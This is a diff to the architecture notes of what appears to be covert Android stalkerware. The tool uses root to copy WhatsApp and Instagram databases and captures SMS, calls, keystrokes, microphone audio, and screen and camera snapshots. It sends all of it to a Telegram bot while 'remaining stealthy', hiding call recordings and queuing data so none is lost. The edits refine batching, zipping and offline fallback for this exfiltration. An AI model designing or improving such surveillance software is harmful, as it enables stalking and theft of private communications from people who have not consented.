@@ -58,6 +58,7 @@ To prevent SQLite "database locked" errors and torn reads, the live database is 
 
 - **Scoped Storage Virtualization Bypass:** The `watchdir` is strictly localized to `context.filesDir` (e.g., `/data/data/com.system.superiormonitor/files/`). This forces the root shell (`su`) and the app to operate in the exact same raw internal mount namespace, eliminating silent `SQLITE_CORRUPT` or "File doesn't exist" errors caused by Android's external FUSE filesystem isolation.
 - **Root Ownership Bypass (`chown`):** Immediately after root-copying the databases, a `chown $uid:$uid` command restores app-level write permissions on the copied files. Because the copied files are effectively "dirty", they are opened using `SQLiteDatabase.OPEN_READWRITE`. This allows the SQLite engine to automatically perform necessary WAL rollbacks and checkpoints upon connection without throwing `1032 SQLITE_READONLY_DBMOVED`.
+- **Robust Read-Only Fallback**: If the root `su` copy fails to grant standard `666` `READWRITE` permissions (crashing SQLite with a Read-Only Database error), the logic seamlessly defaults to `SQLiteDatabase.OPEN_READONLY` to safely extract messages anyway.
 - **Atomic Cleanup**: Preemptive `rm -f` calls guarantee corrupted or lingering SQLite handlers do not infect fresh syncs.
 
 ### Instagram Direct Messages
@@ -93,24 +94,24 @@ sequenceDiagram
     SM->>SM: Format & forward to OfflineManager
 ```
 
-## 3. Live Text Batching Mechanism (Flood Protection)
+## 3. Unified Live Batching Mechanism (Flood Protection & Albums)
 
-To prevent Telegram `429 Too Many Requests` API errors caused by floods of rapid real-time notifications (especially during intense group chats or when connectivity is restored), all text notifications are funneled through a centralized batching engine inside `BotService`.
+To prevent Telegram `429 Too Many Requests` API errors caused by floods of rapid real-time telemetry (especially during intense group chats, media bursts, or when connectivity is restored), all text notifications and media captures are funneled through a centralized `BatchManager` and `ZipManager` in `UtilityActivities.kt`.
 
 ### Engine Architecture
-- **`messageBuffers` (ConcurrentHashMap)**: Safely stores incoming messages per application source in real-time, preserving both the text and its original markdown formatting (`parseMode`).
-- **`throttleJobs` (ConcurrentHashMap)**: Maintains coroutine jobs that handle the countdown sequence for each app.
-- **`sendMutex` (Global Mutex)**: A universal lock ensuring that even if multiple apps trigger simultaneously (e.g., an SMS and a WhatsApp message arrive at the exact same millisecond), they wait in line and execute synchronously.
+- **`BatchManager`**: A centralized concurrent queue engine that uses Coroutines, `ConcurrentHashMap`, and `Mutex` locks to debounce and serialize telemetry across all live monitors (Call, SMS, Notifications, Social Media).
+- **`ZipManager`**: A unified compression engine that sorts live media bursts by exact MIME type (Images, Videos, Audio, Documents) to prevent Telegram API grouping crashes.
 
-### 3-Second Dynamic Window Logic
-1. When the *first* message arrives from a source, a hidden 3-second timer starts.
-2. Any subsequent messages from that same app within those 3 seconds are silently added to the buffer.
-3. When the 3 seconds elapse, the system assesses the buffer size:
-   - **Low Traffic (1 to 3 messages)**: The messages are sent individually with a 1-second delay between each. This guarantees correct markdown rendering and real-time delivery.
-   - **High Traffic (4+ messages)**: The system automatically bundles all messages into a clean, formatted `.txt` document (e.g., `whatsapp_bulk.txt`). This single document is uploaded, bypassing rate limits entirely and keeping the Telegram chat clean.
-4. **Safety Cap (25 messages)**: If an extreme flood occurs, the buffer flushes instantly upon hitting 25 messages, bypassing the 3-second timer to prevent RAM overflow.
+### Dynamic Window Logic (Text & Media)
+1. **Text & Notifications (3-Second Debounce)**: When a message arrives, a 3-second timer starts. 
+   - **1–2 messages**: Sent individually with 1-second delays, preserving markdown formatting.
+   - **3+ messages**: Bundled into a `.txt` document (e.g., `📦 Live Batch Upload`) and uploaded as a single file, bypassing rate limits entirely.
+2. **Media Extraction (8-Second Debounce)**: WhatsApp/Instagram media utilizes an extended 8-second window.
+   - **2-3 visual files**: Uploaded seamlessly as a native Telegram Album (`MediaGroup`) containing perfect header context inherited from the first message.
+   - **>3 visual files (or large documents)**: Compressed into dedicated ZIP archives via `ZipManager`.
+3. **Safety Cap (25 entries)**: Extreme floods instantly flush the buffer to prevent RAM overflow.
 
-*Fail-safe*: If any individual message or bundled document fails to upload, the entire batch is immediately handed to `OfflineManager.queueOnlyInternal()`, ensuring zero data loss.
+*Fail-safe*: If any individual message or bundled media fails to upload, the payload is securely copied into `OfflineManager` directories using robust cross-mount `copyTo` functions, ensuring zero data loss.
 
 ---
 
@@ -124,13 +125,16 @@ An `AudioManager.OnAudioFocusChangeListener` is registered. If the system grants
 
 ### File Routing
 
-Audio outputs are saved dynamically to `context.getExternalFilesDir("mediaops/microp_temp")` to avoid Scoped Storage restrictions. All file upload actions are explicitly routed through `MediaUploader.kt`, ensuring automatic offline fallback on failure.
+Audio outputs are saved dynamically to `context.getExternalFilesDir("mediaops/microp_temp")` to avoid Scoped Storage restrictions. All file upload actions are explicitly routed through `MediaUploader.kt`. If an upload fails, failed live microphone recordings are correctly routed to the `mediaops/offline` sub-directory, guaranteeing that the `OfflineManager` can successfully sweep and restore them later.
 
 ---
 
-## 5. Snapshot Engine Race Conditions
+## 5. Snapshot Engine Race Conditions & ANR Prevention
 
 The `SnapshotEngine` coordinates background screen captures and camera captures via `AlarmManager`. All root-level capture execution is cleanly abstracted into `CaptureHelper.kt`.
+
+### Broadcast Receiver ANR Eradication
+To bypass Android's strict 10-second life limit on Broadcast Receivers, all background processing was stripped from the `SnapshotReceiver`. Intents are now instantly forwarded to `BotService`, which delegates execution to the `SnapshotWorker` via a background Coroutine (`Dispatchers.IO`). This totally eliminates system-enforced ANR terminations during heavy capture loads.
 
 ### Thread Safety
 
@@ -207,19 +211,19 @@ Enabling Hotspot programmatically requires bypassing Android's standard user pro
 To ensure zero data loss while remaining stealthy, all captured data follows a strict lifecycle from interception to Telegram delivery. 
 
 ### How Data is Sent
-When a monitor (like SMS or WhatsApp) intercepts an event, it formats the raw data into a clean, markdown-escaped message. This payload is routed into the live text batching engine (Section 3). If approved for dispatch, it passes to the unified `TelegramApi.kt`, which handles the physical HTTP request to Telegram's servers.
+When a monitor (like SMS or WhatsApp) intercepts an event, it formats the raw data into a clean, markdown-escaped message. This payload is routed into the centralized `BatchManager` (Section 3). If approved for dispatch, it passes to the unified `TelegramApi.kt`, which handles the physical HTTP request to Telegram's servers.
 
 ### What Happens if Sending Fails (Offline Routing)
 If the device loses internet access, `NetworkRecoveryManager` detects it and pauses polling loops. Any outbound data is rerouted:
-- **Text Logs (SMS, Calls, WhatsApp, Keylogs)**: Appended to persistent `.txt` files (e.g., `offline_sms.txt`) inside the app's internal cache via `OfflineManager.queueOnlyInternal()`.
-- **Recordings & Snapshots**: Heavy files are securely moved into unified `captures/screen/`, `captures/front/`, or `captures/rear/` offline directories. Call recordings are handled similarly.
+- **Text Logs (SMS, Calls, WhatsApp, Keylogs)**: Appended to persistent `.txt` files (e.g., `offline_sms.txt`) inside the app's internal cache via `OfflineManager.queueOnlyInternal()`. Textual context is flawlessly preserved even if media extraction succeeds.
+- **Recordings, Snapshots & Social Media**: Heavy files are securely moved into unified `captures/` or `whatsapp/offline/media` directories using a robust `file.copyTo(..., overwrite=true)` function to bypass cross-mount filesystem blocks.
 - **On-Demand Commands**: If an admin manually requests a live Microphone recording and the upload fails, the audio is safely dropped into the offline queue to be synced later. (Note: On-demand live screen captures intentionally bypass offline queues and self-delete).
 
 ### What Happens When Connectivity is Restored (Offline Sync)
-When the device connects back to the internet, `NetworkRecoveryManager` detects the network, waits for DNS stabilization, and initiates a Trickle-Sync via `OfflineManager`:
+When the device connects back to the internet, `NetworkRecoveryManager` detects the network, waits for DNS stabilization, and initiates a Trickle-Sync via `OfflineManager`. To prevent overlapping with live sweeps, `ZipManager` utilizes a strict `Mutex` lock on offline directories.
 - **Text Logs & Fetch Backups**: The queued `.txt` files are uploaded as document attachments. Once Telegram confirms receipt, the local `.txt` file is **immediately deleted**.
 - **Recordings & Audio**: Uploaded sequentially with a mandatory 2-second delay to avoid `HTTP 429` rate limits. Upon success, call recordings are securely moved to a hidden `permanent` storage directory on the device for long-term local retention.
-- **Snapshots**: The engine counts the pending offline photos. If there are 1 to 3 photos, they upload individually. If there are **more than 3**, the system natively compresses them into a single `.zip` archive for a fast, bulk upload. Upon success, all original images are permanently deleted.
+- **Media & Snapshots**: `ZipManager` natively sorts accumulated offline media by exact MIME type (Images, Videos, Audio, Documents). If there are 2 to 3 photos/videos, they group flawlessly into a native Telegram Album (`MediaGroup`). If there are **more than 3**, the system compiles them into dedicated ZIP archives for a fast, bulk upload.
 
 ---
 
